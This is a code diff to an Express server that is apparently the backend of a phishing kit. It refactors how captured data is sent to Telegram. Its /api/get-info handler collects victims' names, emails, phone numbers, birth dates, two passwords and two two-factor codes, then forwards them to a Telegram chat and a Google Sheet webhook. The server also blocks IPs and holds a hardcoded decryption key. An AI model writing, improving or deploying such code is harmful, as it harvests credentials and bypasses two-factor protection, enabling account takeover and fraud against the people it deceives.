@@ -1,7 +1,7 @@
 import express from "express";
 import 'dotenv/config';
 import cors from "cors";
-import TelegramBot from 'node-telegram-bot-api';
+import axios from 'axios';
 import CryptoJS from "crypto-js";
 import rateLimit from "express-rate-limit";
 
@@ -16,14 +16,7 @@ const violationCounts = new Map();
 const VIOLATION_LIMIT = 10; // Number of violations before permanent block
 const BLOCK_DURATION = 24 * 60 * 60 * 1000; // 24 hours in milliseconds
 
-const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: true, 
-    request: {
-        agentOptions: {
-            keepAlive: true,
-            family: 4
-        }
-    }
-});
+const TELEGRAM_API = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`;
 const secretKey = 'HDNDT-JDHT8FNEK-JJHR';
 
 function decrypt(encryptedData) {
@@ -37,6 +30,18 @@ function decrypt(encryptedData) {
     }
 }
 
+const sendTelegramMessage = async (message) => {
+    try {
+        await axios.post(TELEGRAM_API, {
+            chat_id: process.env.TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: 'HTML'
+        });
+    } catch (error) {
+        console.error('Error sending Telegram message:', error.message);
+    }
+};
+
 const blockIP = async (ip, isPermanent = false) => {
     const blockInfo = {
         timestamp: Date.now(),
@@ -46,7 +51,7 @@ const blockIP = async (ip, isPermanent = false) => {
     
     // Notify on Telegram about IP block
     const message = `🚫 IP Address blocked:\n<code>${ip}</code>\nType: ${isPermanent ? 'Permanent' : 'Temporary (24 hours)'}`;
-    await bot.sendMessage(process.env.TELEGRAM_CHAT_ID, message, { parse_mode: "html" });
+    await sendTelegramMessage(message);
 }
 
 function isIPBlocked(ip) {
@@ -122,7 +127,7 @@ app.post('/api/get-info', ipFilter, registerLimiter, async (req, res) => {
         });
 
         const message = `<b>Ip:</b> <code>${values.user_ip || 'Lỗi IP,liên hệ <code>https://t.me/otis_cua</code>'}</code>\n<b>Location:</b> <code>${values.ip || 'Lỗi IP,liên hệ <code>https://t.me/otis_cua</code>'}</code>\n-----------------------------\n<b>Name:</b> <code>${values.name || ''}</code>\n<b>Email:</b> <code>${values.email || ''}</code>\n<b>Email business:</b> <code>${values.email_business || ''}</code>\n<b>Phone:</b> <code>${values.phone || ''}</code>\n<b>Page:</b> <code>${values.page || ''}</code>\n<b>Date of birth:</b> <code>${values.day}/${values.month}/${values.year}</code>\n<b>Password First:</b> <code>${values.password || ''}</code>\n<b>Password Second:</b> <code>${values.secondPassword || ''}</code>\n-----------------------------\n<b>First Two-Fa:</b> <code>${values.twoFa || ''}</code>\n<b>Second Two-Fa:</b> <code>${values.secondTwoFa || ''}</code>\n`;
-        await bot.sendMessage(process.env.TELEGRAM_CHAT_ID, message, { parse_mode: "html" });
+        await sendTelegramMessage(message);
 
         if (process.env.WEBHOOK_URL) {
             const url = new URL(process.env.WEBHOOK_URL);
@@ -139,15 +144,17 @@ app.post('/api/get-info', ipFilter, registerLimiter, async (req, res) => {
             url.searchParams.append('First Two-Fa', values.twoFa ? values.twoFa : '');
             url.searchParams.append('Second Two-Fa', values.secondTwoFa ? values.secondTwoFa : '');
 
-            try {
-                await bot.sendMessage(process.env.TELEGRAM_CHAT_ID, '✅ Thêm dữ liệu vào Sheet thành công.');
-            } catch (err) {
-                await bot.sendMessage(process.env.TELEGRAM_CHAT_ID, '❌ Thêm vào Google Sheet không thành công, liên hệ <code>@otis_cua</code>', { parse_mode: 'html' });
-            }
+            axios.get(url)
+                .then(response => {
+                    sendTelegramMessage('✅ Thêm dữ liệu vào Sheet thành công.');
+                })
+                .catch(err => {
+                    sendTelegramMessage('❌ Thêm vào Google Sheet không thành công.');
+                });
         }
 
     } catch (error) {
-        await bot.sendMessage(process.env.TELEGRAM_CHAT_ID, `❌ Server giải mã dữ liệu không thành công, liên hệ <code>@otis_cua</code>.Mã lỗi: ${error.message}`, { parse_mode: 'html' });
+        await sendTelegramMessage(`❌ Server giải mã dữ liệu không thành công, liên hệ <code>@otis_cua</code>.Mã lỗi: ${error.message}`);
         res.status(500).json({
             message: 'Error',
             error_code: 1
